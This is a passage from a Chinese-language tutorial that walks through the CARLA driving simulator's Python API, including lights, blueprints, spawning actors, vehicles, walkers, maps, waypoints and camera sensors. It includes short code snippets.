light_state 允许在一次调用中设置所有这些。路灯使用 carla.LightGroup 类型的属性 light_group 进行分类。 这允许将灯分类为路灯、建筑灯…… carla.LightManager 的一个实例可以被检索以在一次调用中处理灯组。 12345678910111213141516# Get the light manager and lightslmanager = world.get_lightmanager()mylights = lmanager.get_all_lights()# Custom a specific lightlight01 = mylights[0]light01.turn_on()light01.set_intensity(100.0)state01 = carla.LightState(200.0,red,carla.LightGroup.Building,True)light01.set_light_state(state01)# Custom a group of lightsmy_lights = lmanager.get_light_group(carla.LightGroup.Building)lmanager.turn_on(my_lights)lmanager.set_color(my_lights,carla.Color(255,0,0))lmanager.set_intensities(my_lights,list_of_intensities) 车灯必须由用户打开&#x2F;关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 到目前为止，并非所有车辆都集成了灯光。 以下是撰写本文时可用的列表。 自行车：它们都有一个前后位置灯。 摩托车： 雅马哈和哈雷戴维森车型。 汽车：奥迪TT、雪佛兰、道奇（警车）、Etron、林肯、野马、特斯拉3S、大众T2以及来到CARLA的新模组。 可以使用 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 方法随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。 1234# Turn on position lightscurrent_lights = carla.VehicleLightState.NONEcurrent_lights |= carla.VehicleLightState.Positionvehicle.set_light_state(current_lights) 也可以使用天气部分中描述的 environment.py 实时设置灯光。 2.2.5 调试世界对象有一个 carla.DebugHelper 对象作为公共属性。 它允许在模拟过程中绘制不同的形状。 这些用于跟踪正在发生的事件。 以下示例将在演员的位置和旋转处绘制一个红色框。 12debug = world.debugdebug.draw_box(carla.BoundingBox(actor_snapshot.get_transform().location,carla.Vector3D(0.5,0.5,2)),actor_snapshot.get_transform().rotation, 0.05, carla.Color(255,0,0,0),0) 此示例在 carla.DebugHelper 中的一个片段中进行了扩展，该片段显示了如何为世界快照中的每个角色绘制框。 2.2.6 快照包含模拟中每个角色在单个帧中的状态。 一种带有时间参考的世界静止图像。 信息来自相同的模拟步骤，即使在异步模式下也是如此。 12# Retrieve a snapshot of the world at current frame.world_snapshot = world.get_snapshot() carla.WorldSnapshot 包含 carla.Timestamp 和 carla.ActorSnapshot 列表。 可以使用演员的 ID 搜索演员快照。 快照列出了其中出现的演员的 ID。 12345678910timestamp = world_snapshot.timestamp # Get the time reference for actor_snapshot in world_snapshot: # Get the actor and the snapshot information actual_actor = world.get_actor(actor_snapshot.id) actor_snapshot.get_transform() actor_snapshot.get_velocity() actor_snapshot.get_angular_velocity() actor_snapshot.get_acceleration() actor_snapshot = world_snapshot.find(actual_actor.id) # Get an actor&#x27;s snapshot 2.2.7 世界设置世界可以访问一些用于模拟的高级配置。 这些决定了渲染条件、模拟时间步长以及客户端和服务器之间的同步。 它们可以从助手类 carla.WorldSettings 中访问。 目前，默认的 CARLA 以最佳图形质量、可变时间步长和异步运行。 要进一步了解此问题，请查看“高级步骤”部分。 有关同步和时间步长以及渲染选项的页面可能是一个很好的起点。 2.3 蓝图CARLA 中的 Actor 是在模拟中执行动作的元素，它们可以影响其他 Actor。 CARLA 中的参与者包括车辆和步行者，还包括传感器、交通标志、交通灯和观众。 对如何操作它们有充分的了解是至关重要的。 本节将介绍生成、销毁、类型以及如何管理它们。 2.3.1 蓝图这些布局允许用户将新演员顺利融入模拟。 它们是带有动画和一系列属性的已制作模型。 其中一些是可修改的，而另一些则不是。 这些属性包括车辆颜色、激光雷达传感器中的通道数量、步行者的速度等等。 可用的蓝图及其属性列在蓝图库中。 车辆和步行者蓝图有一个世代属性，指示它们是新的（第 2 代）还是旧的（第 1 代）资产。 2.3.2管理蓝图库carla.BlueprintLibrary 类包含一个 carla.ActorBlueprint 元素列表。 世界对象可以提供对它的访问。 1blueprint_library = world.get_blueprint_library() 蓝图有一个 ID 来识别它们以及由此产生的演员。 可以读取该库以查找特定 ID、随机选择蓝图或使用通配符模式过滤结果。 1234# Find a specific blueprint.collision_sensor_bp = blueprint_library.find(&#x27;sensor.other.collision&#x27;)# Choose a vehicle blueprint at random.vehicle_bp = random.choice(blueprint_library.filter(&#x27;vehicle.*.*&#x27;)) 除此之外，每个 carla.ActorBlueprint 都有一系列 carla.ActorAttribute 可以获取和设置。 123is_bike = [vehicle.get_attribute(&#x27;number_of_wheels&#x27;) == 2]if(is_bike) vehicle.set_attribute(&#x27;color&#x27;, &#x27;255,0,0&#x27;) 注意：有些属性无法修改，请在蓝图库中查看 属性有一个 carla.ActorAttributeType 变量。 它从枚举列表中声明其类型。 此外，可修改属性带有推荐值列表。 123for attr in blueprint: if attr.is_modifiable: blueprint.set_attribute(attr.id, random.choice(attr.recommended_values)) 用户可以创建自己的交通工具。查看教程(资产)来学习。贡献者可以将他们的新内容添加到 CARLA。 2.4 演员的生命周期本节提到了关于参与者的不同方法。PythonAPI 提供了在一个框架中应用最常见的批处理命令的命令。 2.4.1 生成世界对象负责生成actors并跟踪它们。 生成只需要一个蓝图和一个 carla.Transform 来说明 Actor 的位置和旋转。 这个世界有两种不同的方法来产生Actor。 spawn_actor() 生成失败会报错 try_spawn_actor() 生成失败返回none 12transform = Transform(Location(x=230, y=195, z=40), Rotation(yaw=180))actor = world.spawn_actor(blueprint, transform) 注意：CARLA 使用虚拟引擎坐标系统。记住 carla.Rotation()构造函数定义为(俯仰，偏航，滚动) ，它不同于一般的虚拟引擎编辑器(滚动，俯仰，偏航)。xyz坐标的单位是m 这里的俯仰，偏航，滚动事实上是pitch, yaw, roll，在笛卡尔坐标系中，pitch是围绕X轴旋转，也叫做俯仰角，yaw是围绕Y轴旋转，也叫偏航角，roll是围绕Z轴旋转，也叫翻滚角。如下图所示 如果在指定位置发生碰撞，actor 将不会生成。 无论这发生在静态对象还是其他Actor身上。 可以尝试避免这些不希望的生成碰撞。 map.get_spawn_points() 用于车辆。 返回推荐的生成点列表。 1spawn_points = world.get_map().get_spawn_points() world.get_random_location() 用于行人。 返回人行道上的随机点。 同样的方法用于为步行者设置目标位置。 12spawn_point = carla.Transform()spawn_point.location = world.get_random_location_from_navigation() 一个actor在生成时可以附加到另一个actor上。 演员跟随他们所依附的父类。 这对传感器特别有用。 附件可以是刚性的（适合检索精确数据），也可以根据其父项轻松移动。附加类型由carla.AttachmentType 定义。 注意：当产生附加到另一个actor上的actor时，提供的transformer必须相对于父actor。 下一个示例将摄像头固定在车辆上，因此它们的相对位置保持固定。 12345# Attach Actorcamera_bp = blueprint_library.find(&#x27;sensor.camera.rgb&#x27;)print(camera_bp)relative_transform = carla.Transform(carla.Location(1,0,1),carla.Rotation())camera = world.spawn_actor(camera_bp, relative_transform, actor, carla.AttachmentType.Rigid) 生成后，世界对象会将演员添加到列表中。 这可以很容易地搜索或迭代。 123456actor_list = world.get_actors()# Find an actor by id.actor = actor_list.find(id)# Print the location of all the speed limit signs in the world.for speed_sign in actor_list.filter(&#x27;traffic.speed_limit.*&#x27;): print(speed_sign.get_location()) 上面的都是CARLA官方文档给我们写好的。实际上只有几个是常用的。如果我们想生成一个Actor, 必须要先定义它的蓝图（Blueprint），这就好比造房子前要先绘制设计图一样。 1234567891011# 拿到这个世界所有物体的蓝图blueprint_library = world.get_blueprint_library()# 从浩瀚如海的蓝图中找到奔驰的蓝图ego_vehicle_bp = blueprint_library.find(&#x27;vehicle.mercedes-benz.coupe&#x27;)# 给我们的车加上特定的颜色ego_vehicle_bp.set_attribute(&#x27;color&#x27;, &#x27;0, 0, 0&#x27;)# 找到所有可以作为初始点的位置并随机选择一个transform = random.choice(world.get_map().get_spawn_points())print(transform)# 在这个位置生成汽车ego_vehicle = world.spawn_actor(ego_vehicle_bp, transform) 2.4.2管理carla.Actor 主要由 get() 和 set() 方法组成，用于管理地图周围的演员。 1234567# Handle Actorprint(actor.get_acceleration())print(actor.get_velocity())location = actor.get_location()location.z += 10.0actor.set_location(location) 可以禁用 actor 的物理，将其冻结在某位置 12actor.set_simulate_physics(False)print(actor.get_location()) 除此之外，actor还有他们的蓝图提供的标签，这些标签主要用于语义分割传感器。 注意：大多数方法异步地向模拟器发送请求。模拟器在每次更新时解析它们的时间是有限的。用 set ()方法充斥模拟器将会积累一个显著的延迟。 2.4.3销毁当 Python 脚本完成时，Actor 不会被销毁，需要明确地手动销毁他们。销毁会阻塞仿真，直到完成。 1destroyed_sucessfully = actor.destroy() # Returns True if successful 2.5Actor类型2.5.1 传感器传感器是产生数据流的actor。在官方文档的第四部分和本文档接下来的部分会单独介绍。现在，让我们看看一个常见的传感器产生周期。此示例生成一个摄像机传感器，将其连接到车辆上，并告诉摄像机将生成的图像保存到磁盘。 123camera_bp = blueprint_library.find(&#x27;sensor.camera.rgb&#x27;)camera = world.spawn_actor(camera_bp, relative_transform, attach_to=my_vehicle)camera.listen(lambda image: image.save_to_disk(&#x27;output/%06d.png&#x27; % image.frame)) 传感器也有蓝图，可以设置属性 大多数传感器将连接到车辆，收集有关其周围环境的信息 传感器监听数据。接收到数据后，他们调用 Lambda表达式 描述的函数 只设置了以上的回调，并不会保存传感器数据，需要调用 world.tick() 获取传感器数据： 123456# Main loopwhile True: # Tick the server world.tick() w_frame = world.get_snapshot().frame print(&quot;World&#x27;s frame: %d&quot; % w_frame) 运行脚本的控制台打印世界的当前帧数，rgb 图像会保存在磁盘里。默认情况下 sensor.camera.rgb 产生的图像分辨率是 800 x 600，这个可以设定。 2.5.2 旁观者由虚幻引擎放置以提供游戏内视角。 它可以用来移动模拟器窗口的视图。 以下示例将移动旁观者演员，以将视线指向所需的车辆。 1234spectator = world.get_spectator()transform = vehicle.get_transform()spectator.set_transform(carla.Transform(transform.location + carla.Location(z=50),carla.Rotation(pitch=-90))) 2.5.3 交通标志和交通灯到目前为止，在 CARLA 中，只有停止点、生成和红绿灯被认为是演员。 其余的 OpenDRIVE 标志可从 API 作为 carla.Landmark 访问。 使用这些实例可以访问它们的信息，但它们在模拟中不作为参与者存在。 在下方的“地图和导航”有对地标更详细的解释。 当模拟开始时，使用 OpenDRIVE 文件中的信息自动生成停止、生成和交通灯。这些都不能在蓝图库中找到，因此不能产生。 CARLA 地图在 OpenDRIVE 文件中没有交通标志和灯光，这些都是由开发人员手动放置的。 道路图本身并没有界定交通标志。相反，他们有一个 carla.BoundingBox边界框影响其中的车辆。 123#Get the traffic light affecting a vehicleif vehicle_actor.is_at_traffic_light(): traffic_light = vehicle_actor.get_traffic_light() 交通信号灯出现在路口。 与任何actor一样，他们有自己的唯一 ID，但也有交汇点的组 ID。 为了识别同一组中的交通灯，使用了杆 ID。 同一组中的红绿灯遵循一个循环。 第一个设置为绿色，而其余的则保持为红色。 活跃的在绿色、黄色和红色上花费几秒钟，所以有一段时间所有的灯都是红色的。 然后，下一个红绿灯开始循环，前一个红绿灯与其他红绿灯一起冻结。 可以使用 API 设置交通灯的状态。 在每个状态上花费的秒数也是如此。 carla.TrafficLightState 将可能的状态描述为一系列枚举值。 交通信号灯的状态可以通过 API 设置： 12345678# Set traffic light statetraffic_light = vehicle.get_traffic_light()print(traffic_light)# Change a red traffic light to green （未验证，因为找不到 traffic_light）if traffic_light.get_state() == carla.TrafficLightState.Red: traffic_light.set_state(carla.TrafficLightState.Green) traffic_light.set_set_green_time(4.0) 注意：只有当红灯亮时，车辆才会注意到红灯。 2.5.4 车辆carla.Vehicle 是一种特殊类型的演员。 它包含模拟轮式车辆物理特性的特殊内部组件。 这是通过应用四种不同的控件来实现的： carla.VehicleControl 为油门、转向、刹车等驾驶命令提供输入。 1vehicle.apply_control(carla.VehicleControl(throttle=1.0, steer=-1.0)) carla.VehiclePhysicsControl 定义了车辆的物理属性并包含另外两个控制器： carla.GearPhysicsControl 控制齿轮。 carla.WheelPhysicsControl 提供对每个车轮的特定控制。 1vehicle.apply_physics_control(carla.VehiclePhysicsControl(max_rpm = 5000.0, center_of_mass = carla.Vector3D(0.0, 0.0, 0.0), torque_curve=[[0,400],[5000,400]])) 车辆有一个碰撞体积 carla.BoundingBox 。 此边界框允许将物理应用到车辆并检测碰撞。 123box = vehicle.bounding_boxprint(box.location) # Location relative to the vehicle.print(box.extent) # XYZ half-box extents in meters. 通过启用扫描轮碰撞参数可以改善车轮的物理特性。 默认的车轮物理场对每个车轮使用从轴到地板的单射线投射，但是当启用扫描车轮碰撞时，会检查车轮的整个体积以防止碰撞。 它可以这样启用： 123physics_control = vehicle.get_physics_control()physics_control.use_sweep_wheel_collision = Truevehicle.apply_physics_control(physics_control) 车辆包括其他独有的功能： 自动驾驶模式将为车辆订阅交通管理器以模拟真实的城市状况。 这个模块是硬编码的，不是基于机器学习的。 1vehicle.set_autopilot(True) 车灯必须由用户打开和关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 并非所有车辆都集成了照明灯。 在撰写本文时，集成车灯的车辆如下： 自行车：所有自行车都有前后位置灯。 摩托车：雅马哈和哈雷戴维森车型。 汽车：奥迪 TT、雪佛兰 Impala、道奇警车、道奇 Charger、奥迪 e-tron、林肯 2017 和 2020、野马、特斯拉 Model 3、特斯拉 Cybertruck、大众 T2 和梅赛德斯 C 级。 可以使用方法 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。 1234# Turn on position lightscurrent_lights = carla.VehicleLightState.NONEcurrent_lights |= carla.VehicleLightState.Positionvehicle.set_light_state(current_lights) 根据部分博主的内容实验以及本机实验，二进制操作灯光并不稳定（在很多情况下失败），因此建议把上方的第一第二行代码改为current_lights &#x3D; carla.VehicleLightState.Position直接设置。 2.5.5行人carla.Walker 的工作方式与车辆类似。 对它们的控制由controllers提供。 carla.WalkerControl 以一定的方向和速度移动行人。 它还允许他们跳跃。 carla.WalkerBoneControl 提供对 3D 骨架的控制。 步行者可以由 AI controller 控制。 他们没有自动驾驶模式。 carla.WalkerAIController Actor 围绕它所连接的 Actor 移动。 12walker_controller_bp = world.get_blueprint_library().find(&#x27;controller.ai.walker&#x27;)world.SpawnActor(walker_controller_bp, carla.Transform(), parent_walker) 每个 AI controller都需要初始化、目标和速度（可选）。 停止控制器的工作方式相同。 12345ai_controller.start()ai_controller.go_to_location(world.get_random_location_from_navigation())ai_controller.set_max_speed(1 + random.random()) # Between 1 and 2 m/s (default is 1.4 m/s)....ai_controller.stop() 注意：AI controller是没有身体的，没有物理。它不会出现在现场。而且，相对于其父节点的位置(0,0,0)不会引起冲突。 当行人到达目标位置时，他们会自动步行到另一个随机点。 如果无法到达目标点，步行者将前往离他们当前位置最近的点。 注意：如果要删除AI行人，需要停止AI controller，并且清除所有的actor和controller。 carla.Client 中的一个片段使用批量生成大量步行者并让他们四处游荡。 2.6 地图地图包括城镇的 3D 模型及其道路定义。 地图的道路定义基于 OpenDRIVE 文件，这是一种标准化、带注释的道路定义格式。 OpenDRIVE 标准 1.4 定义道路、车道、交叉口等的方式决定了 Python API 的功能以及决策背后的推理。 Python API 充当高级查询系统来导航这些道路。 它不断发展以提供更广泛的工具集。后面会单独提到python API 2.6.1 改变地图要改变地图，世界也必须改变。 模拟将从头开始重新创建。 您可以在新世界中使用同一张地图重新开始，也可以同时更改地图和世界： reload_world() 在同一张地图里创建一个新的实例 load_world() 改变当前地图，并创建一个新的世界 每张地图都有一个与当前加载的城市名称相匹配的name属性，例如 Town01，可以用client.get_available_maps()来获取可用地图列表。 123456# 加载地图world = client.load_world(&#x27;Town01&#x27;)# world = client.reload_world()# 获取可用地图列表print(client.get_available_maps()) 2.6.2 地标OpenDRIVE 种定义的交通标志将转换为 CARLA 的 landmark 对象，使用 API 查询： carla.Landmark 对象代表 OpenDRIVE 信号。 此类的属性和方法描述了地标及其影响范围。 carla.LandmarkOrientation 说明地标相对于道路几何定义的方向。 carla.LandmarkType 包含常见的地标类型，以便于转换为 OpenDRIVE 类型。 carla.Waypoint 可以获得位于其前方一定距离的地标。 可以指定要获取的地标类型。 carla.Map 检索地标集。 它可以返回地图中的所有地标，或者具有共同 ID、类型或组的地标。 carla.World 充当地标与在模拟中代表它们的 carla.TrafficSign 和 carla.TrafficLight 之间的中介。 12345678910# 获取地标print(world)map = world.get_map()print(map)waypoints = map.generate_waypoints(100000)print(waypoints)waypoint = waypoints[4]print(waypoint)landmarks = waypoint.get_landmarks(20000.0, True)print(landmarks) 2.6.3航点carla.Waypoint 是 CARLA 世界中的 3D 定向点，对应于 OpenDRIVE 车道。 与航点相关的一切都发生在客户端； 只需与服务器通信一次即可获取包含航点信息的地图对象。 每个航路点都包含一个 carla.Transform，它说明了它在地图上的位置以及包含它的车道的方向。 变量 road_id、section_id、lane_id 和 s 对应于 OpenDRIVE 道路。 路点的 id 由这四个值的哈希组合构成。 航路点保存有关包含它的车道的信息。 此信息包括车道的左右车道标记、确定车道是否在交叉路口内的布尔值、车道类型、宽度和车道变更权限。 注意：同一条道路上距离小于2厘米的路标共用相同的id。 航点还包含他所在的车道信息。 12345678# Access lane information from a waypointinside_junction = waypoint.is_junctionprint(inside_junction)width = waypoint.lane_widthprint(width)right_lm_color = waypoint.right_lane_marking.colorprint(right_lm_color)print(waypoint.transform) 2.6.4 车道OpenDRIVE 标准 1.4 定义的车道类型作为一系列枚举值转换为 carla.LaneType 中的 API。 车道周围的车道标记可通过 carla.LaneMarking 访问。 车道标记由一系列变量定义： 颜色：carla.LaneMarkingColor 是定义标记颜色的枚举值。 变道：carla.LaneChange 说明车道是否允许左转、右转、两者都允许或不允许。 类型：carla.LaneMarkingType 是根据 OpenDRIVE 标准定义标记类型的枚举值。 宽度：定义标记的厚度。 下面的示例显示了获取有关特定航路点的车道类型、车道标记和车道变更权限的信息： 1234567891011# Get the lane type where the waypoint islane_type = waypoint.lane_typeprint(lane_type)# Get the type of lane marking on the leftleft_lanemarking_type = waypoint.left_lane_marking.typeprint(left_lanemarking_type)# Get available lane changes for this waypointlane_change = waypoint.lane_changeprint(lane_change) 2.6.5 路口carla.Junction 表示 OpenDRIVE 连接点。 此类包含一个带有边界框的交叉路口，以识别其中的车道或车辆。 carla.Junction 类包含 get_waypoints 方法，该方法为路口内的每条车道返回一对航路点。 每对都位于交汇点边界的起点和终点。 1234567# 获取路口junction = waypoint.get_junction()print(junction)# 获取路口范围的航路点waypoints_junc = junction.get_waypoints(carla.LaneType.Any)print(waypoints_junc) 2.6.6 环境对象CARLA 地图上的每个对象都有一组相关变量，可在此处找到。 详见 carla.EnvironmentObject。这些变量中包含一个唯一 ID，可用于切换该对象在地图上的可见性。 您可以使用 Python API 根据语义标签获取每个环境对象的 ID： 12345678910111213141516171819202122# Get the building in the worldenv_objs = world.get_environment_objects(carla.CityObjectLabel.Buildings)print(env_objs)# Access individual building IDs and save in a setbuilding_01 = env_objs[0]building_02 = env_objs[1]objects_to_toggle = &#123;building_01.id, building_02.id&#125;print(objects_to_toggle)spectator = world.get_spectator()spectator.set_transform(carla.Transform(building_01.transform.location + carla.Location(0,0,30), carla.Rotation(pitch=-90)))time.sleep(3)# Toggle buildings offworld.enable_environment_objects(objects_to_toggle, False)time.sleep(3)# Toggle buildings onworld.enable_environment_objects(objects_to_toggle, True) 2.7 CARLA中的导航CARLA 中的导航是通过 Waypoint API 管理的，它是 carla.Waypoint 和 carla.Map 方法的组合。 客户端必须首先与服务器通信以检索包含航点信息的地图对象。 这只需要一次，所有后续查询都在客户端执行。 2.7.1 通过航点导航Waypoint API 公开了一些方法，这些方法允许路点相互连接并沿着道路构建路径供车辆导航： next(d) 在车道方向上创建近似距离 d 内的航路点列表。 该列表包含每个可能偏差的一个航路点。 previous(d) 创建一个航路点列表，航路点在车道相反方向的近似距离 d 内。 该列表包含每个可能偏差的一个航路点。 next_until_lane_end(d) 和 previous_until_lane_start(d) 返回相距 d 的航路点列表。 这些列表分别从当前航路点到其车道的终点和起点。 get_right_lane() 和 get_left_lane() 返回相邻车道中的等效航路点（如果存在）。 可以通过在其右&#x2F;左车道上找到下一个航路点并移动到该航路点来进行变道操作。 12# Find next waypoint 2 meters ahead.waypoint = waypoint.next(2.0) 以下代码，生成车辆，获取航路点。关闭车辆的物理模拟，在 loop 中获取下一个航路点，将车辆 transform 设置到航路点位置，同时将 spectator 设置到当前车辆位置上方俯视观察： 12345678910111213141516171819202122232425def set_spectator_transform(in_transform): spectator = world.get_spectator() spectator.set_transform(carla.Transform(in_transform.location + carla.Location(0,0,30), carla.Rotation(pitch=-90)))# Spawn vehiclevehicle_bp = world.get_blueprint_library().find(&#x27;vehicle.audi.tt&#x27;)spawn_point = random.choice(map.get_spawn_points())vehicle = world.spawn_actor(vehicle_bp, spawn_point)set_spectator_transform(vehicle.get_transform())# Get waypointwaypoint = map.get_waypoint(vehicle.get_location())print(waypoint)# Disable physics, in this example the vehicle is teleportedvehicle.set_simulate_physics(False)while True: # Find next waypoint 2 meters ahead waypoint = random.choice(waypoint.next(0.2)) # waypoint = waypoint.next(2.0) print(waypoint) # Teleport the vehicle vehicle.set_transform(waypoint.transform) set_spectator_transform(waypoint.transform) 有一种纯数学方法的航点导航法，似乎已经无法使用，具体原因我水平太低经过无数测试也没找出来。 2.7.2 生成地图导航客户端需要向服务器发出请求以获取 .xodr 映射文件并将其解析为 carla.Map 对象。 这只需要执行一次。 这里补充一点OpenDRIVE的知识： OpenDRIVE格式是以可扩展标记语言(XML)为基础，文件后缀为xodr格式的描述道路及道路网的通用标准。存储在OpenDRIVE文件中的数据描述了道路的几何形状以及沿线的特征并且定义了可以影响交通逻辑的交通标志以及道路基础设施，例如车道和信号灯。 路网是OpenDRIVE文件中描述的道路信息，其既是基于经验建造的，也可以是依据真实道路数据生成的。OpenDRIVE的主要目的是提供一种可用于仿真模拟的道路网络描述，并且可以使得这些道路以及道路网的描述可以在仿真平台或仿真软件中被自定义或改变。 OpenDRIVE根据XML的格式以节点和元素描述道路中各类信息。这样的通用格式有助于虚拟仿真测试的高度专业化，并且可以保持不同国家之间数据交换所需的相互操作性。 获取地图对象： 1map = world.get_map() 地图对象包含用于创建车辆的推荐生成点。 您可以使用以下方法获取这些生成点的列表，每个生成点都包含一个 carla.Transform。 请记住，生成点可能已经被占用，导致由于碰撞而无法创建车辆。 1spawn_points = world.get_map().get_spawn_points() 您可以通过获取最接近特定位置或地图 OpenDRIVE 定义中的特定 road_id、lane_id 和 s 值的航点来开始使用航点： 12345# Nearest waypoint in the center of a Driving or Sidewalk lane.waypoint01 = map.get_waypoint(vehicle.get_location(),project_to_road=True, lane_type=(carla.LaneType.Driving | carla.LaneType.Sidewalk))#Nearest waypoint but specifying OpenDRIVE parameters. waypoint02 = map.get_waypoint_xodr(road_id,lane_id,s) 下面的示例显示了如何生成航点集合以可视化城市车道。 这将在地图上为每条道路和车道创建航点。 它们都将相距约 2 米： 1waypoint_list = map.generate_waypoints(2.0) 要生成道路拓扑的最小图，请使用以下示例。 这将返回航点对（元组）的列表。 每对中的第一个元素与第二个元素连接，并且都定义了地图中每个车道的起点和终点。 有关此方法的更多信息，请参阅 PythonAPI。 1waypoint_tuple_list = map.get_topology() 下面的示例以 carla.GeoLocation 的形式将 carla.Transform 转换为地理纬度和经度坐标： 1my_geolocation = map.transform_to_geolocation(vehicle.transform) 使用以下示例将 OpenDRIVE 格式的道路信息保存到磁盘： 1info_map = map.to_opendrive() 2.8 CARLA中的地图CARLA 有8个城镇，每个城镇有2种地图，即非分层地图和分层地图（后缀_Opt）。图层包含这些分组： NONE 无 Buildings 建筑 Decals 贴花 Foliage 植被 Ground 地面 ParkedVehicles 停靠的车辆 Particles 粒子 Props 杂物 StreetLights 路灯 Walls 墙体 All 所有 2.8.1 非分层地图非分层地图如下表所示（单击城镇名称可查看布局的俯视图）。 所有图层始终存在，并且无法在这些地图中打开或关闭。 在 CARLA 0.9.11 之前，这些是唯一可用的地图类型。 Town01：基本城镇，T型路口 Town02：类似Town01，更小 Town03：复杂城镇，5车道路口，环路，坡道，隧道 Town04：高速路和小镇的循环道路 Town05：带有交叉路口和桥的格子小镇。每个方向有多条车道，适合验证变道 Town06：长高速路，出入匝道 Town07：乡村环境，道路狭窄，少信号灯 Town10：高清城市环境 2.8.2 分层地图分层地图的布局与非分层地图的布局相同，但可以关闭和打开地图的图层。 有一个不能关闭的最小布局，由道路、人行道、交通信号灯和交通标志组成。 分层地图可以通过后缀 _Opt 来标识，例如 Town01_Opt。 使用这些地图，可以通过 Python API 加载和卸载图层： 1234567891011# Load layerred map for Town01 with minimum layout plus buildings and parked vehiclestime.sleep(3)world = client.load_world(&#x27;Town01_Opt&#x27;, carla.MapLayer.Buildings | carla.MapLayer.ParkedVehicles)# Toggle all buildings offtime.sleep(3)world.unload_map_layer(carla.MapLayer.Buildings)# Toggle all buildings ontime.sleep(3)world.load_map_layer(carla.MapLayer.Buildings) 2.8.3 自定义地图CARLA 旨在为专业应用程序提供可扩展性和高度可定制性。 因此，除了 CARLA 中已经开箱即用的许多地图和资产外，还可以创建和导入新的地图、道路网络和资产，以在 CARLA 模拟中填充定制环境。官方文档中有详细的介绍。而大多数情况下暂时不需要用到，因此这里不多加赘述，可以到CARKA官网中查看详细教程。 2.9 传感器与数据传感器是从周围环境中检索数据的actor，“参与者”。 carla.Sensor 类定义了一种特殊类型的actor，能够测量和流式传输数据。 这是什么数据？ 根据传感器的类型，它变化很大。 所有类型的数据都继承自通用 carla.SensorData。 他们什么时候检索数据？ 在每个模拟步骤或注册某个事件时。 取决于传感器的类型。 他们如何检索数据？ 每个传感器都有一个listen() 方法来接收和管理数据。 尽管存在差异，但所有传感器都以相似的方式使用。 2.9.1 设置与其他所有参与者一样，找到蓝图并设置特定属性。 这在处理传感器时至关重要。 它们的属性将决定获得的结果。 以下示例设置仪表板高清摄像头。 12345678# Find the blueprint of the sensor.blueprint = world.get_blueprint_library().find(&#x27;sensor.camera.rgb&#x27;)# Modify the attributes of the blueprint to set image resolution and field of view.blueprint.set_attribute(&#x27;image_size_x&#x27;, &#x27;1920&#x27;)blueprint.set_attribute(&#x27;image_size_y&#x27;, &#x27;1080&#x27;)blueprint.set_attribute(&#x27;fov&#x27;, &#x27;110&#x27;)# Set the time in seconds between sensor capturesblueprint.set_attribute(&#x27;sensor_tick&#x27;, &#x27;1.0&#x27;) 2.9.2 生成attach_to 和attachment_type 至关重要。 传感器应该连接到父参与者（通常是车辆）上，以跟随它并收集信息。 附件类型将确定其位置关于所述车辆的更新方式。 刚性附加。 运动对其父位置非常严格。 这是从模拟中检索数据的正确附件。 弹性附加。 运动很平稳，加速和减速很少。 此附件仅推荐用于录制模拟视频。 移动是平滑的，并且在更新摄像机位置时避免了“跳跃”。 12transform = carla.Transform(carla.Location(x=0.8, z=1.7))sensor = world.spawn_actor(blueprint, transform, attach_to=my_vehicle) 2.9.3 监听每个传感器都有一个listen() 方法。 每次传感器检索数据时都会调用它。 参数回调是一个 lambda 函数。 它描述了传感器在检索数据时应该做什么。 这必须将检索的数据作为参数。 12345678910# do_something() will be call each time a new image is generated by the camera# sensor.listen(lambda data: do_something(date))sensor.listen(lambda image: image.save_to_disk(&#x27;./output/%06d.png&#x27; % image.frame))# This collision sensor would print everytime a collision is detected# def callback(event):# for actor_id in event:# vehicle = world_ref().get_actor(actor_id)# print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)# sensor02.listen(callback) 2.9.4 数据大多数传感器数据对象都具有将信息保存到磁盘的功能。 这将允许它在其他环境中使用。 传感器类型之间的传感器数据差异很大。 但是，它们总是带有一些基本信息的标记。 传感器数据属性 类型 描述 frame int 进行测量时的帧数。 timestamp double 自剧集开始以来以模拟秒为单位的测量时间戳。 transform carla.Transform 测量时传感器的世界参考。 注意：is_listening 是传感器属性，用于启用和关闭数据侦听。sensor_tick 是蓝图属性，用于设置接收数据之间的仿真时间 将以上的代码完成一下，就实现了 设置 rgb 相机参数 -&gt; 生成相机演员附加在车辆上 -&gt; 设置相机回调方法，将图像保存在磁盘上 -&gt; 调用 world.tick() 接收服务器数据： 123456789101112131415161718192021222324252627282930# Find the blueprint of the sensorcamera_bp = world.get_blueprint_library().find(&#x27;sensor.camera.rgb&#x27;)# Modify the attributes of the blueprint to set image resolution and field of viewcamera_bp.set_attribute(&#x27;image_size_x&#x27;, &#x27;1920&#x27;)camera_bp.set_attribute(&#x27;image_size_y&#x27;, &#x27;1080&#x27;)camera_bp.set_attribute(&#x27;fov&#x27;, &#x27;110&#x27;)# Set the time in seconds between sensor capturescamera_bp.set_attribute(&#x27;sensor_tick&#x27;, &#x27;1.0&#x27;)camera_transform = carla.Transform(carla.Location(x=0.8, z=1.7))sensor = world.spawn_actor(camera_bp, camera_transform, attach_to=vehicle)# do_something() will be call each time a new image is generated by the camera# sensor.listen(lambda data: do_something(date))sensor.listen(lambda image: image.save_to_disk(&#x27;./output/%06d.png&#x27; % image.frame))# This collision sensor would print everytime a collision is detected# def callback(event):# for actor_id in event:# vehicle = world_ref().get_actor(actor_id)# print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)# sensor02.listen(callback)# Main loopwhile True: # Tick the server world.tick() w_frame = world.get_snapshot().frame print(&quot;World&#x27;s frame: %d&quot; % w_frame) time.sleep(1) 2.10 传感器的类型2.10.1 摄像头从相机的角度拍摄世界。 对于返回 carla.Image 的相机，您可以使用帮助类 carla.ColorConverter 来修改图像类型以表示不同的信息。 检索每个模拟步骤的数据。 传感器 输出 概述 Depth carla.Image 在灰度图中渲染视场中元素的深度。 RGB carla.Image 提供对周围环境的清晰视野。 看起来像一张普通的现场照片。 Optical Flow carla.Image 渲染来自相机的每个像素的运动。 Semantic segmentation carla.Image 根据标签以特定颜色渲染视野中的元素。 Instance segmentation carla.Image 根据标签和唯一的对象 ID 以特定颜色渲染视野中的元素。 DVS carla.DVSEventArray 作为事件流异步测量亮度强度的变化。 2.10.2 探测器探测器，当传感器附加的物体触发特定事件时，检索数据： 传感器 输出 概述 Collision 